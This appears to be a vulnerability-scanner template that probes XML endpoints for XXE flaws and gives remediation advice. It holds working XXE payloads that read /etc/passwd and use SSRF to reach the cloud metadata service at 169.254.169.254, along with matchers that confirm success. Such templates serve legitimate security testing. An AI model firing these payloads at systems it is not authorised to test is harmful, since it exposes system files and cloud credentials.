id: generic-xxe
info:
  name: XML External Entity Injection
  description: Tests for XXE vulnerabilities in XML processing endpoints
  owasp_category: A03:2021
  severity: high
  tags:
    - xxe
    - xml
    - injection
    - generic

requests:
  - name: XXE file read via /xml endpoint
    method: POST
    path: /xml
    headers:
      Content-Type: application/xml
    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
      <data>&xxe;</data>
    matchers:
      - type: regex
        regex:
          - 'root:x:[0-9]+:[0-9]+:'
          - '/bin/bash'
          - 'daemon:'
        condition: or
    on_match:
      vulnerability: XXE_FILE_READ
      message: XXE allows reading local files
      remediation: Disable external entities in XML parser

  - name: XXE SSRF via /xml endpoint
    method: POST
    path: /xml
    headers:
      Content-Type: application/xml
    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
      <data>&xxe;</data>
    matchers:
      - type: regex
        regex:
          - 'ami-[a-f0-9]{8}'
          - 'placement'
          - 'instance-id'
        condition: or
    on_match:
      vulnerability: XXE_SSRF
      message: XXE allows SSRF to cloud metadata
      remediation: Disable external entities and use allow-list for URLs

  - name: XXE file read via /api/upload
    method: POST
    path: /api/upload
    headers:
      Content-Type: application/xml
    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
      <data>&xxe;</data>
    matchers:
      - type: regex
        regex:
          - 'root:x:[0-9]+:[0-9]+:'
        condition: or
    on_match:
      vulnerability: XXE_FILE_READ
      message: XXE in upload endpoint allows file read
